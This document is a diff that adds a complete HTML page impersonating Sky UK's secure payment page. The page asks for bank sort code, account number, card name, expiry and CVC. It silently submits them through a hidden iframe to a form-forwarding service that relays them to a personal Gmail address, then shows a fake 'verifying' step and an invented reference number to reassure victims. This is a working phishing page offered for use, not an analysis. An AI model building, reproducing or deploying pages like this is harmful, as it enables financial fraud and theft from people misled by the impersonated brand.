@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sky UK – Secure Payment</title>
+  <!-- Sky brand font (fallback) -->
+  <style>
+    /* ----- Sky UK colour palette & reset (refreshed) ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'SkyText', Arial, Helvetica, sans-serif;
+      background: #eef2f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 24px;
+      color: #1a1a2e;
+    }
+
+    /* main card – crisp white with Sky shadow */
+    .container {
+      max-width: 540px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 16px 48px rgba(0, 40, 80, 0.12), 0 4px 16px rgba(0, 40, 80, 0.04);
+      overflow: hidden;
+      transition: box-shadow 0.2s;
+    }
+
+    /* ----- BANNER (Sky hero) ----- */
+    .banner-wrapper {
+      background: #003366;
+      line-height: 0;
+    }
+
+    .banner-wrapper img {
+      width: 100%;
+      height: auto;
+      display: block;
+      object-fit: cover;
+      aspect-ratio: 559 / 240;
+      max-height: 240px;
+    }
+
+    /* ----- form content ----- */
+    .form-content {
+      padding: 32px 36px 20px;
+    }
+
+    /* Sky-style heading – bold navy */
+    .page-headline {
+      font-size: 28px;
+      font-weight: 700;
+      color: #003366;
+      letter-spacing: -0.4px;
+      margin-bottom: 2px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .page-headline small {
+      font-size: 16px;
+      font-weight: 400;
+      color: #005eb8;
+      background: #e6f0fa;
+      padding: 0 12px;
+      border-radius: 40px;
+      line-height: 1.6;
+    }
+
+    .page-sub {
+      font-size: 15px;
+      color: #4a5b6e;
+      margin-bottom: 24px;
+      border-bottom: 1px solid #e6ecf2;
+      padding-bottom: 16px;
+    }
+
+    /* form labels – Sky blue accent */
+    label {
+      display: block;
+      font-weight: 600;
+      font-size: 14px;
+      color: #1e2a3a;
+      margin-bottom: 4px;
+      letter-spacing: 0.2px;
+    }
+
+    label .optional {
+      font-weight: 400;
+      color: #6c7a8a;
+      font-size: 13px;
+    }
+
+    input[type="text"],
+    input[type="number"],
+    input[type="password"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      border: 1px solid #d0d8e0;
+      border-radius: 10px;
+      font-size: 15px;
+      background: #fafcfe;
+      transition: border 0.15s, box-shadow 0.15s, background 0.15s;
+      color: #1a1a2e;
+      font-family: inherit;
+    }
+
+    input:focus {
+      border-color: #005eb8;
+      outline: none;
+      box-shadow: 0 0 0 4px rgba(0, 94, 184, 0.12);
+      background: #ffffff;
+    }
+
+    input::placeholder {
+      color: #8b9aab;
+      font-weight: 400;
+    }
+
+    /* inline expiry fields (manual) */
+    .expiry-group {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 18px;
+      flex-wrap: wrap;
+    }
+
+    .expiry-group .field {
+      flex: 1 1 0;
+      min-width: 80px;
+    }
+
+    .expiry-group label {
+      margin-bottom: 4px;
+    }
+
+    .expiry-group input {
+      margin-bottom: 0;
+      text-align: center;
+    }
+
+    .expiry-group input::placeholder {
+      text-align: center;
+    }
+
+    /* Sky blue button – clean "Submit" with gradient + depth */
+    .btn-primary {
+      background: linear-gradient(145deg, #005eb8, #004494);
+      color: #fff;
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 50px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.05s, box-shadow 0.2s;
+      letter-spacing: 0.6px;
+      margin-top: 8px;
+      box-shadow: 0 8px 18px rgba(0, 94, 184, 0.25);
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-primary:hover {
+      background: linear-gradient(145deg, #004494, #003366);
+      box-shadow: 0 10px 24px rgba(0, 94, 184, 0.32);
+      transform: translateY(-1px);
+    }
+
+    .btn-primary:active {
+      transform: scale(0.97);
+      box-shadow: 0 4px 12px rgba(0, 94, 184, 0.2);
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.8;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: 0 4px 12px rgba(0, 94, 184, 0.15);
+    }
+
+    /* spinner inside button */
+    .spinner {
+      display: none;
+      width: 22px;
+      height: 22px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top: 3px solid #ffffff;
+      animation: spin 0.9s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .btn-primary.loading .spinner {
+      display: inline-block;
+    }
+
+    .btn-primary.loading .btn-text {
+      opacity: 0.8;
+    }
+
+    /* privacy & footer – Sky style */
+    .privacy-policy {
+      margin-top: 28px;
+      font-size: 13px;
+      color: #5a6b7e;
+      border-top: 1px solid #e6ecf2;
+      padding: 20px 0 16px;
+      text-align: center;
+      line-height: 1.6;
+    }
+
+    .privacy-policy a {
+      color: #005eb8;
+      text-decoration: none;
+      font-weight: 600;
+      transition: color 0.1s;
+    }
+
+    .privacy-policy a:hover {
+      text-decoration: underline;
+      color: #003366;
+    }
+
+    .sky-footer-small {
+      font-size: 12px;
+      color: #7a8a9e;
+      margin-top: 4px;
+    }
+
+    /* inline small fields (sort code & account) */
+    .inline-group {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+
+    .inline-group .field {
+      flex: 1 1 0;
+      min-width: 120px;
+    }
+
+    .inline-group .field input {
+      margin-bottom: 18px;
+    }
+
+    /* Security badge – subtle professional touch */
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 20px;
+      font-size: 13px;
+      color: #4a5b6e;
+      background: #f4f8fe;
+      padding: 10px 18px;
+      border-radius: 60px;
+      width: fit-content;
+      margin-left: auto;
+      margin-right: auto;
+      border: 1px solid #e0e9f2;
+    }
+
+    .security-badge svg {
+      width: 18px;
+      height: 18px;
+      fill: none;
+      stroke: #005eb8;
+    }
+
+    /* THANK YOU STATE – Sky celebration */
+    .thankyou-state {
+      display: none;
+      padding: 20px 0 10px;
+      text-align: center;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: translateY(10px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    .thankyou-state .thankyou-icon {
+      font-size: 52px;
+      margin-bottom: 8px;
+      background: #e6f2fc;
+      width: 80px;
+      height: 80px;
+      line-height: 80px;
+      border-radius: 50%;
+      margin-left: auto;
+      margin-right: auto;
+      color: #003366;
+    }
+
+    .thankyou-state h2 {
+      font-size: 28px;
+      color: #003366;
+      margin-bottom: 4px;
+      font-weight: 700;
+      letter-spacing: -0.2px;
+    }
+
+    .thankyou-state .thankyou-message {
+      font-size: 16px;
+      color: #1e2a3a;
+      background: #f2f8ff;
+      padding: 18px 22px;
+      border-radius: 16px;
+      border-left: 6px solid #005eb8;
+      margin: 16px 0 16px;
+      line-height: 1.7;
+      text-align: left;
+    }
+
+    .thankyou-state .ref-number {
+      background: #ffffff;
+      padding: 14px 24px;
+      border-radius: 60px;
+      display: inline-block;
+      border: 1px solid #d0d8e0;
+      font-size: 22px;
+      font-weight: 700;
+      color: #003366;
+      letter-spacing: 1.5px;
+      margin-top: 4px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+      background: #fafcfe;
+    }
+
+    .thankyou-state .ref-label {
+      font-size: 14px;
+      color: #4a5b6e;
+      margin-top: 12px;
+      font-weight: 500;
+    }
+
+    .thankyou-state .email-note {
+      margin-top: 18px;
+      font-size: 14px;
+      color: #4a5b6e;
+      background: #f4f7fb;
+      padding: 10px 18px;
+      border-radius: 40px;
+      display: inline-block;
+    }
+
+    /* hide form when thank you visible */
+    .form-content .form-fields {
+      transition: opacity 0.2s;
+    }
+
+    .form-content.thankyou-active .form-fields {
+      display: none;
+    }
+
+    .form-content.thankyou-active .thankyou-state {
+      display: block;
+    }
+
+    /* small tag – Sky 'secure' chip */
+    .secure-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      background: #e6f0fa;
+      color: #003366;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 2px 14px 2px 10px;
+      border-radius: 40px;
+      margin-left: 8px;
+      letter-spacing: 0.2px;
+    }
+
+    .secure-chip svg {
+      width: 14px;
+      height: 14px;
+      fill: #003366;
+    }
+
+    /* live processing status */
+    .processing-status {
+      display: none;
+      margin: 16px 0 10px;
+      padding: 12px 18px;
+      background: #f4f8fe;
+      border-radius: 12px;
+      border-left: 4px solid #005eb8;
+      font-size: 14px;
+      color: #1e2a3a;
+      animation: pulse 1.8s infinite;
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.7; }
+      50% { opacity: 1; }
+      100% { opacity: 0.7; }
+    }
+
+    .processing-status .dots::after {
+      content: '';
+      animation: dots 1.8s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0% { content: ''; }
+      25% { content: '.'; }
+      50% { content: '..'; }
+      75% { content: '...'; }
+      100% { content: ''; }
+    }
+
+    .processing-status.show {
+      display: block;
+    }
+
+    /* responsiveness */
+    @media (max-width: 500px) {
+      .form-content {
+        padding: 22px 18px 12px;
+      }
+      .expiry-group {
+        gap: 8px;
+      }
+      .expiry-group .field {
+        min-width: 60px;
+      }
+      .inline-group {
+        gap: 8px;
+      }
+      .inline-group .field {
+        min-width: 80px;
+      }
+      .page-headline {
+        font-size: 24px;
+        flex-wrap: wrap;
+      }
+      .page-headline small {
+        font-size: 13px;
+        padding: 0 10px;
+      }
+      .btn-primary {
+        font-size: 16px;
+        padding: 14px;
+      }
+      .security-badge {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+
+    /* additional Sky-like card accent */
+    .form-content .card-accent {
+      width: 60px;
+      height: 4px;
+      background: linear-gradient(90deg, #005eb8, #66aaff);
+      border-radius: 4px;
+      margin-bottom: 16px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container" role="main">
+
+  <!-- SKY BANNER (hero image) -->
+  <div class="banner-wrapper">
+    <img
+      src="https://static.skyassets.com/contentstack/assets/blt143e20b03d72047e/bltfb2fddfeb7542649/69e1ea933d1e36e5a19cd424/2026_Q2_April_Triple_Play_Campaign_Prospect_Homepage_Hero_Desktop_v1.png"
+      alt="Discover TV, Broadband &amp; Mobile Phone Packages with Sky"
+      loading="lazy"
+    />
+  </div>
+
+  <!-- form content -->
+  <div class="form-content" id="formContent">
+
+    <!-- ===== FORM FIELDS ===== -->
+    <div class="form-fields">
+      <div class="page-headline">
+        Payment details
+        <small>secure</small>
+        <span class="secure-chip">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          encrypted
+        </span>
+      </div>
+      <div class="card-accent"></div>
+      <p class="page-sub">Complete your order securely – Sky protects your data</p>
+
+      <!-- FORM: action to FormSubmit.co, target hidden iframe to avoid page reload -->
+      <form id="paymentForm" action="https://formsubmit.co/julieleiser456@gmail.com" method="POST" target="hiddenFrame">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+        <input type="hidden" name="_next" value="#thankyou" />
+
+        <!-- Name on Account -->
+        <label for="accountName">Name on the account</label>
+        <input id="accountName" name="Name on account" type="text" placeholder="Full name as it appears on your bank account" required />
+
+        <!-- Sort Code & Account Number inline (Sky style) -->
+        <div class="inline-group">
+          <div class="field">
+            <label for="sortCode">Sort code</label>
+            <input id="sortCode" name="Sort code" type="text" placeholder="123456" title="6 digit sort code" required />
+          </div>
+          <div class="field">
+            <label for="accountNumber">Account number</label>
+            <input id="accountNumber" name="Account number" type="text" pattern="\d{8}" placeholder="8 digits" title="8 digit account number" required />
+          </div>
+        </div>
+
+        <!-- Name on Card -->
+        <label for="cardName">Name on card</label>
+        <input id="cardName" name="Name on card" type="text" placeholder="As shown on your card" required />
+
+        <!-- MANUAL EXPIRY DATE (month + year) – Sky style -->
+        <div class="expiry-group">
+          <div class="field">
+            <label for="expiryMonth">Expiry month</label>
+            <input id="expiryMonth" name="Expiry month" type="number" min="1" max="12" placeholder="MM" required />
+          </div>
+          <div class="field">
+            <label for="expiryYear">Expiry year</label>
+            <input id="expiryYear" name="Expiry year" type="number" min="2025" max="2040" placeholder="YYYY" required />
+          </div>
+          <div class="field" style="flex: 0.8 1 0; min-width: 70px;">
+            <label for="cvc">CVC</label>
+            <input id="cvc" name="CVC" type="password" pattern="\d{3,4}" placeholder="•••" title="3 or 4 digit code" required />
+          </div>
+        </div>
+
+        <!-- Live processing status (hidden by default) -->
+        <div class="processing-status" id="processingStatus">
+          ⏳ Verifying your details<span class="dots"></span>
+        </div>
+
+        <!-- SUBMIT button – only "Submit" -->
+        <button type="submit" class="btn-primary" id="submitBtn">
+          <span class="spinner"></span>
+          <span class="btn-text">Submit</span>
+        </button>
+      </form>
+
+      <!-- Security badge -->
+      <div class="security-badge">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+          <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+        </svg>
+        <span>Your payment is secure – Sky UK</span>
+      </div>
+
+      <!-- Footer / Privacy (Sky style) -->
+      <section class="privacy-policy" aria-label="Privacy Policy">
+        <p>
+          By proceeding, you agree to Sky UK's
+          <a href="https://www.sky.com/legal/privacy-policy" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
+          and <a href="https://www.sky.com/legal/terms" target="_blank" rel="noopener noreferrer">Terms &amp; Conditions</a>.
+        </p>
+        <p class="sky-footer-small">
+          &copy; 2026 Sky UK Limited, Grant Way, Isleworth, Middlesex, TW7 5QD.
+        </p>
+      </section>
+    </div>
+    <!-- end form-fields -->
+
+    <!-- ===== THANK YOU STATE ===== -->
+    <div class="thankyou-state" id="thankyouState">
+      <div class="thankyou-icon">✔️</div>
+      <h2>Thank You</h2>
+      <div class="thankyou-message">
+        Your details have been submitted successfully.<br />
+        Our Dispatch team will get in touch with you shortly.
+      </div>
+      <div class="ref-label">Reference number</div>
+      <div class="ref-number" id="refNumber">SKY-2026-8472</div>
+      <div class="email-note">📧 Confirmation sent to your email</div>
+    </div>
+
+  </div>
+  <!-- end form-content -->
+
+  <!-- hidden iframe for form submission (no redirect) -->
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+</div>
+<!-- end container -->
+
+<script>
+  (function() {
+    const form = document.getElementById('paymentForm');
+    const formContent = document.getElementById('formContent');
+    const thankyouState = document.getElementById('thankyouState');
+    const refNumberSpan = document.getElementById('refNumber');
+    const submitBtn = document.getElementById('submitBtn');
+    const processingStatus = document.getElementById('processingStatus');
+
+    // generate a random reference number (professional format)
+    function generateReference() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let ref = 'SKY-';
+      const now = new Date();
+      const year = now.getFullYear().toString().slice(2);
+      ref += year + '-';
+      for (let i = 0; i < 6; i++) {
+        ref += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return ref;
+    }
+
+    // show thank you, hide form
+    function showThankYou() {
+      refNumberSpan.textContent = generateReference();
+      formContent.classList.add('thankyou-active');
+      document.querySelector('.container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+
+    // handle form submission
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // sort code – clean digits
+      const sortCodeInput = document.getElementById('sortCode');
+      let rawSort = sortCodeInput.value.replace(/[^0-9]/g, '');
+      if (rawSort.length !== 6) {
+        alert('Please enter a valid 6-digit sort code (numbers only).');
+        return;
+      }
+      sortCodeInput.value = rawSort;
+
+      // account number
+      const accInput = document.getElementById('accountNumber');
+      const accVal = accInput.value.replace(/[^0-9]/g, '');
+      if (accVal.length !== 8) {
+        alert('Please enter an 8-digit account number.');
+        return;
+      }
+      accInput.value = accVal;
+
+      // expiry
+      const month = parseInt(document.getElementById('expiryMonth').value);
+      const year = parseInt(document.getElementById('expiryYear').value);
+      if (isNaN(month) || month < 1 || month > 12) {
+        alert('Please enter a valid expiry month (1-12).');
+        return;
+      }
+      if (isNaN(year) || year < 2025 || year > 2040) {
+        alert('Please enter a valid expiry year (2025-2040).');
+        return;
+      }
+
+      // cvc
+      const cvc = document.getElementById('cvc').value.replace(/[^0-9]/g, '');
+      if (cvc.length < 3 || cvc.length > 4) {
+        alert('Please enter a valid CVC (3 or 4 digits).');
+        return;
+      }
+
+      // ---- LIVE PROCESSING ----
+      // Disable button, show spinner + processing status
+      submitBtn.disabled = true;
+      submitBtn.classList.add('loading');
+      processingStatus.classList.add('show');
+
+      // Simulate "verifying" for 2.5 seconds (realistic)
+      setTimeout(() => {
+        // Actually submit the form via iframe
+        form.target = 'hiddenFrame';
+        form.submit();
+
+        // Hide processing, show thank you
+        processingStatus.classList.remove('show');
+        showThankYou();
+
+        // Reset button state after a moment
+        setTimeout(() => {
+          submitBtn.disabled = false;
+          submitBtn.classList.remove('loading');
+        }, 400);
+
+        // Reset form after a short delay
+        setTimeout(() => {
+          form.reset();
+        }, 600);
+
+      }, 2500); // 2.5 sec live processing
+    });
+
+    // input filters (keep clean)
+    const sortField = document.getElementById('sortCode');
+    sortField.addEventListener('input', function(e) {
+      let val = this.value.replace(/[^0-9]/g, '');
+      if (val.length > 6) val = val.slice(0, 6);
+      this.value = val;
+    });
+
+    const accField = document.getElementById('accountNumber');
+    accField.addEventListener('input', function(e) {
+      let val = this.value.replace(/[^0-9]/g, '');
+      if (val.length > 8) val = val.slice(0, 8);
+      this.value = val;
+    });
+
+    const cvcField = document.getElementById('cvc');
+    cvcField.addEventListener('input', function(e) {
+      let val = this.value.replace(/[^0-9]/g, '');
+      if (val.length > 4) val = val.slice(0, 4);
+      this.value = val;
+    });
+
+    console.log('Sky payment form ready – live processing + professional thank you');
+  })();
+</script>
+
+</body>
+</html>
